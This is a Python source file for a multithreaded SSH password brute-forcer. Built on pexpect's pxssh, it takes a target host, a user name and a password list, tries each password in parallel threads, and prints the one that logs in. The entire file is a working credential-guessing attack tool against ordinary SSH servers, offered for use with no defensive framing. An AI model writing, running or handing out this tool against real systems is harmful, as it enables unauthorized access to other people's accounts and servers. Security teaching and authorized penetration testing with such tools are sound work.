import optparse
import time
from threading import Thread, BoundedSemaphore
from pexpect import pxssh

max_connect = 5
connection_lock = BoundedSemaphore(value=max_connect)
found = False
fails = 0

def send_command(ssh, cmd):
    ssh.sendline(cmd)
    ssh.prompt()
    print(ssh.before)

def connect(host, user, passwd, release):
    global found, fails
    try:
        ssh = pxssh.pxssh()
        ssh.login(host, user, passwd)
        print('[+] password found: ' + passwd)
        found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, passwd, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, passwd, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='host', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify user')
    parser.add_option('-F', dest='passwd_list', type='string', help='specify password list')

    (options, args) = parser.parse_args()
    host = options.host
    user = options.user
    passwd_list = options.passwd_list
    if (host == None) | (user == None) | (passwd_list == None):
        print(parser.usage)
        exit(0)

    fn = open(passwd_list, 'r')
    for line in fn.readlines():
        if found:
            print('[*] exiting: password found')
            exit(0)
        if fails > 5:
            print('[!] exiting: too many socket timeouts')
            exit(0)
        connection_lock.acquire()
        passwd = line.strip('\r').strip('\n')
        print('[-] testing: ' + str(passwd))

        t = Thread(target=connect, args=(host, user, passwd, True))
        child = t.start()


if __name__ == '__main__':
    main()
